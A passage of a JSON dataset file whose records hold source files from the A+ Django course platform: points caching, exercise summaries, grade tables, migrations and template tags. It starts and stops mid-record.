'unofficial': unofficial,\n                    'date': submission.submission_time,\n                    'url': submission.get_url('submission-plain'),\n                })\n                if (\n                    submission.status == Submission.STATUS.READY and (\n                        entry['unofficial']\n                        or submission.grade >= entry['points']\n                    )\n                ) or (\n                    unofficial and (\n                        not entry['graded']\n                        or (entry['unofficial'] and submission.grade > entry['points'])\n                    )\n                ):\n                    entry.update({\n                        'best_submission': submission.id,\n                        'points': submission.grade,\n                        'passed': not unofficial and submission.grade >= entry['points_to_pass'],\n                        'graded': submission.status == Submission.STATUS.READY,\n                        'unofficial': unofficial,\n                    })\n                if submission.notifications.count() > 0:\n                    entry['notified'] = True\n                    if submission.notifications.filter(seen=False).count() > 0:\n                        entry['unseen'] = True\n\n        # Confirm points.\n        def r_check(parent, children):\n            for entry in children:\n                if (\n                    entry['submittable']\n                    and entry['confirm_the_level']\n                    and entry['passed']\n                ):\n                    if 'unconfirmed' in parent:\n                        del(parent['unconfirmed'])\n                    for child in parent.get('children', []):\n                        if 'unconfirmed' in child:\n                            del(child['unconfirmed'])\n                r_check(entry, entry.get('children', []))\n        for module in modules:\n            r_check(module, module['children'])\n\n        # Collect points and check limits.\n        def add_to(target, entry):\n            target['submission_count'] += entry['submission_count']\n            if entry.get('unofficial', False):\n                pass\n            elif entry.get('unconfirmed', False):\n                self._add_by_difficulty(\n                    target['unconfirmed_points_by_difficulty'],\n                    entry['difficulty'],\n                    entry['points']\n                )\n            else:\n                target['points'] += entry['points']\n                self._add_by_difficulty(\n                    target['points_by_difficulty'],\n                    entry['difficulty'],\n                    entry['points']\n                )\n        def r_collect(module, parent, children):\n            passed = True\n            max_points = 0\n            submissions = 0\n            points = 0\n            confirm_entry = None\n            for entry in children:\n                if entry['submittable']:\n                    if entry['confirm_the_level']:\n                        confirm_entry = entry\n                    else:\n                        passed = passed and entry['passed']\n                        max_points += entry['max_points']\n                        submissions += entry['submission_count']\n                        if entry['graded']:\n                            points += entry['points']\n                            add_to(module, entry)\n                            add_to(categories[entry['category_id']], entry)\n                            add_to(total, entry)\n                passed = (\n                    r_collect(module, entry, entry.get('children', []))\n                    and passed\n                )\n            if confirm_entry and submissions > 0:\n                confirm_entry['confirmable_points'] = True\n            if parent and not parent['submittable']:\n                parent['max_points'] = max_points\n                parent['submission_count'] = submissions\n                parent['points'] = points\n            return passed\n        for module in modules:\n            passed = r_collect(module, None, module['children'])\n            module['passed'] = (\n                passed\n                and module['points'] >= module['points_to_pass']\n            )\n        for category in categories.values():\n            category['passed'] = (\n                category['points'] >= category['points_to_pass']\n            )\n\n        data['points_created'] = timezone.now()\n        return data\n\n    def created(self):\n        return self.data['points_created'], super().created()\n\n    def submission_ids(self, number=None, category_id=None, module_id=None,\n                       exercise_id=None, filter_for_assistant=False, best=True):\n        exercises = self.search_exercises(\n            number=number,\n            category_id=category_id,\n            module_id=module_id,\n            exercise_id=exercise_id,\n            filter_for_assistant=filter_for_assistant,\n        )\n        submissions = []\n        if best:\n            for entry in exercises:\n                sid = entry.get('best_submission', None)\n                if not sid is None:\n                    submissions.append(sid)\n        else:\n            for entry in exercises:\n                submissions.extend(s['id'] for s in entry.get('submissions', []))\n        return submissions\n\n\ndef invalidate_content(sender, instance, **kwargs):\n    course = instance.exercise.course_instance\n    for profile in instance.submitters.all():\n        CachedPoints.invalidate(course, profile.user)\n\ndef invalidate_content_m2m(sender, instance, action, reverse, model, pk_set, **kwargs):\n    # many-to-many field Submission.submitters may be modified without\n    # triggering the Submission post save hook\n    if action not in ('post_add', 'pre_remove'):\n        return\n    if reverse:\n        # instance is a UserProfile\n        if model == Submission:\n            seen_courses = set()\n            for submission_pk in pk_set:\n                try:\n                    submission = Submission.objects.get(pk=submission_pk)\n                    course_instance = submission.exercise.course_instance\n                    if course_instance.pk not in seen_courses:\n                        CachedPoints.invalidate(course_instance, instance.user)\n                    else:\n                        seen_courses.add(course_instance.pk)\n                except Submission.DoesNotExist:\n                    pass\n    else:\n        # instance is a Submission\n        invalidate_content(Submission, instance)\n\ndef invalidate_notification(sender, instance, **kwargs):\n    course = instance.course_instance\n    if not course and instance.submission:\n        course = instance.submission.exercise.course_instance\n    CachedPoints.invalidate(course, instance.recipient.user)\n\n\n# Automatically invalidate cached points when submissions change.\npost_save.connect(invalidate_content, sender=Submission)\npost_delete.connect(invalidate_content, sender=Submission)\npost_save.connect(invalidate_notification, sender=Notification)\npost_delete.connect(invalidate_notification, sender=Notification)\n# listen to the m2m_changed signal since submission.submitters is a many-to-many\n# field and instances must be saved before the many-to-many fields may be modified,\n# that is to say, the submission post save hook may see an empty submitters list\nm2m_changed.connect(invalidate_content_m2m, sender=Submission.submitters.through)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/exercise_summary.py",
        "source": "import itertools\n\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.db.models import Max\n\nfrom course.models import StudentGroup\nfrom .cache.content import CachedContent\nfrom .models import BaseExercise, Submission\n\n\nclass UserExerciseSummary(object):\n    \"\"\"\n    UserExerciseSummary summarises the submissions of a certain user and\n    exercise. It calculates some characterizing figures such as the number of\n    submissions and reference to the best submission. See the public methods\n    for more.\n    \"\"\"\n    def __init__(self, exercise, user=None):\n        self.exercise = exercise\n        self.max_points = getattr(exercise, 'max_points', 0)\n        self.difficulty = getattr(exercise, 'difficulty', '')\n        self.points_to_pass = getattr(exercise, 'points_to_pass', 0)\n        self.user = user\n        self.submissions = []\n        self.submission_count = 0\n        self.best_submission = None\n        self.graded = False\n        self.unofficial = False\n\n        if self.user and self.user.is_authenticated():\n            self.submissions = list(exercise.get_submissions_for_student(\n                user.userprofile))\n            for s in self.submissions:\n                if not s.status in (\n                    Submission.STATUS.ERROR,\n                    Submission.STATUS.REJECTED,\n                ):\n                    self.submission_count += 1\n                    if (\n                        s.status == Submission.STATUS.READY and (\n                            self.best_submission is None\n                            or self.unofficial\n                            or s.grade > self.best_submission.grade\n                        )\n                    ):\n                        self.best_submission = s\n                        self.unofficial = False\n                        self.graded = True\n                    elif (\n                        s.status == Submission.STATUS.UNOFFICIAL and (\n                            not self.graded\n                            or (\n                                self.unofficial\n                                and s.grade > self.best_submission.grade\n                            )\n                        )\n                    ):\n                        self.best_submission = s\n                        self.unofficial = True\n\n    def get_submission_count(self):\n        return self.submission_count\n\n    def get_submissions(self):\n        return self.submissions\n\n    def get_best_submission(self):\n        return self.best_submission\n\n    def get_points(self):\n        return self.best_submission.grade if self.best_submission and not self.unofficial else 0\n\n    def get_penalty(self):\n        return self.best_submission.late_penalty_applied if self.best_submission else None\n\n    def is_missing_points(self):\n        return self.get_points() < self.points_to_pass\n\n    def is_full_points(self):\n        return self.get_points() >= self.max_points\n\n    def is_passed(self):\n        return not self.is_missing_points()\n\n    def is_submitted(self):\n        return self.submission_count > 0\n\n    def is_graded(self):\n        return self.graded\n\n    def is_unofficial(self):\n        return self.unofficial\n\n    def get_group(self):\n        if self.submission_count > 0:\n            s = self.submissions[0]\n            if s.submitters.count() > 0:\n                return StudentGroup.get_exact(\n                    self.exercise.course_instance,\n                    s.submitters.all()\n                )\n        return None\n\n    def get_group_id(self):\n        group = self.get_group()\n        return group.id if group else 0\n\n\nclass ResultTable:\n    \"\"\"\n    WARNING: Constructing this class is a heavy database operation.\n\n    Models the table displaying the grades for each student on each exercise.\n    Result tables are generated dynamically when needed and not stored\n    in a database.\n    \"\"\"\n\n    def __init__(self, course_instance):\n        \"\"\"\n        Instantiates a new ResultTable for the given course instance.\n        After initialization the table is filled with grades from the database.\n        \"\"\"\n        self.course_instance = course_instance\n\n        # Exercises on the course.\n        self.exercises = list(self.__get_exercises())\n        self.categories = course_instance.categories.all()\n\n        # Students on the course.\n        self.students = list(course_instance.get_student_profiles())\n\n        # Empty results table.\n        self.results = {\n            student.id: {\n                exercise.id: None for exercise in self.exercises\n            } for student in self.students\n        }\n        self.results_by_category = {\n            student.id: {\n                category.id: 0 for category in self.categories\n            } for student in self.students\n        }\n\n        # Fill the results with the data from the database.\n        self.__collect_student_grades()\n\n\n    def __get_exercises(self):\n        content = CachedContent(self.course_instance)\n\n        def get_descendant_ids(node):\n            children = node['children']\n            if children:\n                return itertools.chain.from_iterable(\n                    [get_descendant_ids(child) for child in children])\n            return (node['id'],)\n\n        root_node = { 'children': content.modules() }\n        ids = get_descendant_ids(root_node)\n\n        # Loop until end of ids raises StopIteration\n        while True:\n            id = next(ids)\n            try:\n                yield BaseExercise.objects.get(learningobject_ptr_id=id)\n            except ObjectDoesNotExist:\n                continue\n\n\n    def __collect_student_grades(self):\n        \"\"\"\n        Helper for the __init__.\n        This method puts the data from the database in to the results table.\n        \"\"\"\n        submissions = list(Submission.objects \\\n            .filter(\n                exercise__course_module__course_instance=self.course_instance,\n                status=Submission.STATUS.READY\n            ).values(\"submitters\", \"exercise\", \"exercise__category\") \\\n            .annotate(best=Max(\"grade\")) \\\n            .order_by()) # Remove default ordering.\n        for submission in submissions:\n            student_id = submission[\"submitters\"]\n            if student_id in self.results:\n                self.results[student_id][submission[\"exercise\"]] = submission[\"best\"]\n                self.results_by_category[student_id][submission[\"exercise__category\"]] += submission[\"best\"]\n\n\n    def results_for_template(self):\n        \"\"\"\n        Converts the results data into a form that is convenient for to use in a\n        template. The columns of the table ordered according to the order of the\n        exercises in self.exercises.\n        \"\"\"\n        for_template = []\n        for student in self.students:\n            grades = [ self.results[student.id][exercise.id] \\\n                for exercise in self.exercises ]\n            total = sum(g for g in grades if g is not None)\n            for_template.append((student, grades, total))\n        return for_template\n\n\n    def max_sum(self):\n        return sum(e.max_points for e in self.exercises)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nfrom django.utils import timezone\nimport datetime\nimport exercise.submission_models\nimport lib.helpers\nimport exercise.exercise_models\nimport lib.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('inheritance', '0001_initial'),\n        ('userprofile', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseModule',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=255)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('introduction', models.TextField(blank=True)),\n                ('opening_time', models.DateTimeField(default=timezone.now)),\n                ('closing_time', models.DateTimeField(default=timezone.now)),\n                ('late_submissions_allowed', models.BooleanField(default=False)),\n                ('late_submission_deadline', models.DateTimeField(default=timezone.now)),\n                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),\n                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),\n            ],\n            options={\n                'ordering': ['closing_time', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='DeadlineRuleDeviation',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('extra_minutes', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='LearningObject',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('order', models.IntegerField(default=0)),\n                ('name', models.CharField(max_length=255)),\n                ('description', models.TextField(blank=True)),\n                ('instructions', models.TextField(blank=True)),\n                ('service_url', models.URLField(blank=True)),\n            ],\n            options={\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='BaseExercise',\n            fields=[\n                ('learningobject_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.LearningObject')),\n                ('allow_assistant_grading', models.BooleanField(default=False)),\n                ('min_group_size', models.PositiveIntegerField(default=1)),\n                ('max_group_size', models.PositiveIntegerField(default=1)),\n                ('max_submissions', models.PositiveIntegerField(default=10)),\n                ('max_points', models.PositiveIntegerField(default=100)),\n                ('points_to_pass', models.PositiveIntegerField(default=40)),\n            ],\n            options={\n                'ordering': ['course_module__closing_time', 'course_module', 'order', 'id'],\n            },\n            bases=('exercise.learningobject',),\n        ),\n        migrations.CreateModel(\n            name='ExerciseWithAttachment',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n                ('files_to_submit', models.CharField(help_text='File names that user should submit, use pipe character to separate files', max_length=200, blank=True)),\n                ('attachment', models.FileField(upload_to=exercise.exercise_models.build_upload_dir)),\n            ],\n            options={\n                'verbose_name_plural': 'exercises with attachment',\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='AsynchronousExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='LearningObjectCategory',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=35)),\n                ('description', models.TextField(blank=True)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),\n                ('hidden_to', models.ManyToManyField(related_name='hidden_categories', null=True, to='userprofile.UserProfile', blank=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='MaxSubmissionsRuleDeviation',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('extra_submissions', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='StaticExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n                ('exercise_page_content', models.TextField()),\n                ('submission_page_content', models.TextField()),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='Submission',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('submission_time', models.DateTimeField(auto_now_add=True)),\n                ('hash', models.CharField(default=lib.helpers.get_random_string, max_length=32)),\n                ('feedback', models.TextField(blank=True)),\n                ('assistant_feedback', models.TextField(blank=True)),\n                ('status', models.CharField(default=b'initialized', max_length=32, choices=[(b'initialized', 'Initialized'), (b'waiting', 'Waiting'), (b'ready', 'Ready'), (b'error', 'Error')])),\n                ('grade', models.IntegerField(default=0)),\n                ('grading_time', models.DateTimeField(null=True, blank=True)),\n                ('service_points', models.IntegerField(default=0)),\n                ('service_max_points', models.IntegerField(default=0)),\n                ('submission_data', lib.fields.JSONField(blank=True)),\n                ('grading_data', lib.fields.JSONField(blank=True)),\n            ],\n            options={\n                'ordering': ['-submission_time'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='SubmittedFile',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('param_name', models.CharField(max_length=128)),\n                ('file_object', models.FileField(max_length=255, upload_to=exercise.submission_models.build_upload_dir)),\n                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='SynchronousExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='exercise',\n            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='grader',\n            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='submitters',\n            field=models.ManyToManyField(related_name='submissions', to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='maxsubmissionsruledeviation',\n            name='exercise',\n            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='maxsubmissionsruledeviation',\n            name='submitter',\n            field=models.ForeignKey(to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='maxsubmissionsruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='learningobjectcategory',\n            unique_together=set([('name', 'course_instance')]),\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='category',\n            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='course_module',\n            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='deadlineruledeviation',\n            name='exercise',\n            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='deadlineruledeviation',\n            name='submitter',\n            field=models.ForeignKey(to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='deadlineruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/migrations/0005_auto_20150625_1821.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.utils.timezone\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0004_auto_20150617_1033'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='closing_time',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='late_submission_deadline',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='opening_time',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='deadlineruledeviation',\n            name='exercise',\n            field=models.ForeignKey(to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='maxsubmissionsruledeviation',\n            name='exercise',\n            field=models.ForeignKey(to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/migrations/0007_auto_20150625_1835.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('course', '0005_auto_20150625_1835'),\n        ('deviations', '0001_initial')\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='learningobject',\n            name='category',\n            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='course_module',\n            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/migrations/0011_auto_20151218_0857.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0010_auto_20151214_1714'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseChapter',\n            fields=[\n                ('learningobject_ptr', models.OneToOneField(parent_link=True, primary_key=True, to='exercise.LearningObject', serialize=False, auto_created=True)),\n                ('generate_table_of_contents', models.BooleanField(default=False)),\n            ],\n            options={\n            },\n            bases=('exercise.learningobject',),\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='content_head',\n            field=models.TextField(blank=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='parent',\n            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='status',\n            field=models.CharField(choices=[('ready', 'Ready'), ('hidden', 'Hidden'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='url',\n            field=models.CharField(max_length=255, help_text='Input an URL identifier for this object.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')],\n            blank=True, null=True, default=None),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='use_wide_column',\n            field=models.BooleanField(help_text='Remove the third info column for more space.', default=False),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='description',\n            field=models.TextField(help_text='Internal description is not presented on site.', blank=True),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/migrations/0014_ltiexercise.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0004_auto_20150828_1210'),\n        ('exercise', '0013_auto_20151222_1320'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LTIExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(auto_created=True, primary_key=True, serialize=False, parent_link=True, to='exercise.BaseExercise')),\n                ('lti_service', models.ForeignKey(to='external_services.LTIService')),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/migrations/0015_auto_20160124_2139.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('exercise', '0014_ltiexercise'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LearningObjectDisplay',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('learning_object', models.ForeignKey(to='exercise.LearningObject')),\n                ('profile', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='status',\n            field=models.CharField(choices=[('ready', 'Ready'), ('unlisted', 'Unlisted in table of contents'), ('enrollment', 'Enrollment questions'), ('hidden', 'Hidden from non course staff'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/templatetags/exercise.py",
        "source": "import json\nfrom django import template\nfrom django.db.models import Max, Min\nfrom django.template.loader import render_to_string\nfrom django.utils import timezone\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom course.models import CourseModule\nfrom lib.errors import TagUsageError\nfrom ..cache.content import CachedContent\nfrom ..cache.points import CachedPoints\nfrom ..exercise_summary import UserExerciseSummary\nfrom ..models import LearningObjectDisplay, LearningObject, Submission, BaseExercise\n\n\nregister = template.Library()\n\n\ndef _prepare_now(context):\n    if not 'now' in context:\n        context['now'] = timezone.now()\n    return context['now']\n\n\ndef _prepare_context(context, student=None):\n    if not 'instance' in context:\n        raise TagUsageError()\n    instance = context['instance']\n    _prepare_now(context)\n    if not 'content' in context:\n        context['content'] = CachedContent(instance)\n    def points(user, key):\n        if not key in context:\n            context[key] = CachedPoints(instance, user, context['content'])\n        return context[key]\n    if student:\n        return points(student, 'studentpoints')\n    return points(context['request'].user, 'points')\n\n\ndef _get_toc(context, student=None):\n    points = _prepare_context(context, student)\n    context = context.flatten()\n    context.update({\n        'modules': points.modules_flatted(),\n        'categories': points.categories(),\n        'total': points.total(),\n        'is_course_staff': context.get('is_course_staff', False),\n    })\n    return context\n\n\n@register.inclusion_tag(\"exercise/_user_results.html\", takes_context=True)\ndef user_results(context, student=None):\n    values = _get_toc(context, student)\n    values['total_json'] = json.dumps(values['total'])\n    if student:\n        values['is_course_staff'] = False\n    return values\n\n\n@register.inclusion_tag(\"exercise/_user_toc.html\", takes_context=True)\ndef user_toc(context, student=None):\n    return _get_toc(context, student)\n\n\n@register.inclusion_tag(\"exercise/_user_last.html\", takes_context=True)\ndef user_last(context):\n    user = context['request'].user\n    points = _prepare_context(context)\n    if user.is_authenticated():\n        last = LearningObjectDisplay.objects.filter(\n            profile=user.userprofile,\n            learning_object__status=LearningObject.STATUS.READY,\n            learning_object__course_module__course_instance=context['instance'],\n        ).select_related('learning_object').order_by('-timestamp').first()\n        if last:\n            entry,_,_,_ = points.find(last.learning_object)\n            return {\n                'last': entry,\n                'last_time': last.timestamp,\n            }\n    return {\n        'begin': points.begin(),\n        'instance': context['instance'],\n    }\n\n\n@register.inclusion_tag(\"exercise/_category_points.html\", takes_context=True)\ndef category_points(context, student=None):\n    return _get_toc(context, student)\n\n\n@register.inclusion_tag(\"exercise/_submission_list.html\", takes_context=True)\ndef latest_submissions(context):\n    submissions = context[\"profile\"].submissions \\\n        .filter(exercise__course_module__course_instance=context[\"instance\"]) \\\n        .order_by(\"-id\")[:10]\n    return {\n        \"submissions\": submissions,\n        \"title\": _(\"Latest submissions\"),\n        \"empty\": _(\"No submissions for this course.\"),\n    }\n\n\n@register.filter\ndef max_submissions(exercise, user_profile):\n    return exercise.max_submissions_for_student(user_profile)\n\n\n@register.filter\ndef percent(decimal):\n    return int(decimal * 100)\n\n\n@register.filter\ndef submission_status(status):\n    return Submission.STATUS[status]\n\n\ndef _points_data(obj, classes=None):\n    if isinstance(obj, UserExerciseSummary):\n        exercise = obj.exercise\n        data = {\n            'points': obj.get_points(),\n            'max': exercise.max_points,\n            'difficulty': exercise.difficulty,\n            'required': exercise.points_to_pass,\n            'confirm_the_level': exercise.category.confirm_the_level,\n            'missing_points': obj.is_missing_points(),\n            'passed': obj.is_passed(),\n            'full_score': obj.is_full_points(),\n            'submitted': obj.is_submitted(),\n            'graded': obj.is_graded(),\n            'official': not obj.is_unofficial(),\n            'exercise_page': True,\n        }\n    elif isinstance(obj, Submission):\n        exercise = obj.exercise\n        data = {\n            'points': obj.grade,\n            'max': exercise.max_points,\n            'difficulty': exercise.difficulty,\n            'required': exercise.points_to_pass,\n            'confirm_the_level': exercise.category.confirm_the_level,\n            'missing_points': obj.grade < exercise.points_to_pass,\n            'passed': obj.grade >= exercise.points_to_pass,\n            'full_score': obj.grade >= exercise.max_points,\n            'submitted': True,\n            'graded': obj.is_graded,\n            'official': obj.status != Submission.STATUS.UNOFFICIAL,\n        }\n        if not obj.is_graded and (\n                    not exercise.category.confirm_the_level\n                    or obj.status != Submission.STATUS.WAITING\n                ):\n            data['status'] = obj.status\n    else:\n        points = obj.get('points', 0)\n        max_points = obj.get('max_points', 0)\n        required = obj.get('points_to_pass', 0)\n        data = {\n            'points': points,\n            'max': max_points,\n            'difficulty': obj.get('difficulty', ''),\n            'required': required,\n            'confirm_the_level': obj.get('confirm_the_level', False),\n            'missing_points': points < required,\n            'passed': obj.get('passed', True),\n            'full_score': points >= max_points,\n            'submitted': obj.get('submission_count', 0) > 0,\n            'graded': obj.get('graded', True),\n            'status': obj.get('submission_status', False),\n            'unconfirmed': obj.get('unconfirmed', False),\n            'official': not obj.get('unofficial', False),\n            'confirmable_points': obj.get('confirmable_points', False),\n        }\n    percentage = 0\n    required_percentage = None\n    if data['max'] > 0:\n        percentage = int(round(100.0 * data['points'] / data['max']))\n        if data['required']:\n            required_percentage = int(round(100.0 * data['required'] / data['max']))\n    data.update({\n        'classes': classes,\n        'percentage': percentage,\n        'required_percentage': required_percentage,\n    })\n    return data\n\n\n@register.inclusion_tag(\"exercise/_points_progress.html\")\ndef points_progress(obj):\n    return 